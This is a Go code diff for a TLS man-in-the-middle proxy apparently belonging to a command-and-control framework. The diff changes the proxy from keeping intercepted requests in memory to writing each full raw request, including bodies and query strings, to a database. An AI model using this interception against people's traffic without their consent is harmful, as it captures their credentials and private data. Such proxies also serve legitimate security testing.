@@ -1,32 +1,21 @@
 package proxy
 
 import (
+	"c2/models"
+	proxyRepo "c2/repos/proxy"
 	"crypto/rsa"
 	"crypto/tls"
-	"encoding/hex"
 	"encoding/pem"
+	"fmt"
 	"net"
 	"net/http"
 	"net/http/httputil"
 	"os"
+	"time"
 
 	"github.com/elazarl/goproxy"
 	cry "github.com/zarkones/xena-crypto"
 )
-
-type Req struct {
-	ID     int64
-	Host   string
-	Method string
-	Path   string
-	Body   bool
-	Length int
-	RawHex string
-}
-
-var RequestsStream = []Req{}
-
-var RequestsCh = make(chan Req, 999)
 
 func Start(addr, port, pathToDerCert string, privKey *rsa.PrivateKey) (err error) {
 	rawDer, err := os.ReadFile(pathToDerCert)
@@ -57,13 +46,6 @@ func Start(addr, port, pathToDerCert string, privKey *rsa.PrivateKey) (err error
 	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: goproxy.TLSConfigFromCA(&goproxyCA)}
 	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: goproxy.TLSConfigFromCA(&goproxyCA)}
 
-	go func() {
-		for req := range RequestsCh {
-			// TODO: Add more details about the request.
-			RequestsStream = append(RequestsStream, req)
-		}
-	}()
-
 	proxy := goproxy.NewProxyHttpServer()
 	proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
 	// proxy.Verbose = true
@@ -72,16 +54,22 @@ func Start(addr, port, pathToDerCert string, privKey *rsa.PrivateKey) (err error
 		func(r *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 			go func() {
 				rawReq, _ := httputil.DumpRequest(r, true)
-				req := Req{
-					ID:     ctx.Session,
-					Method: r.Method,
-					Host:   r.Host,
-					Path:   r.URL.Path,
-					Length: len(rawReq),
-					RawHex: hex.EncodeToString(rawReq),
+				req := models.ProxyReq{
+					SessionID: ctx.Session,
+					Method:    r.Method,
+					Host:      r.Host,
+					Path:      r.URL.Path,
+					Query:     r.URL.RawQuery,
+					Length:    len(rawReq),
+					Raw:       string(rawReq),
+					Time:      time.Now(),
 				}
-				RequestsCh <- req
+				if err := proxyRepo.Insert(&req); err != nil {
+					fmt.Println("proxy: failed to insert request:", req.SessionID)
+					return
+				}
 			}()
+
 			return r, nil
 		})
 
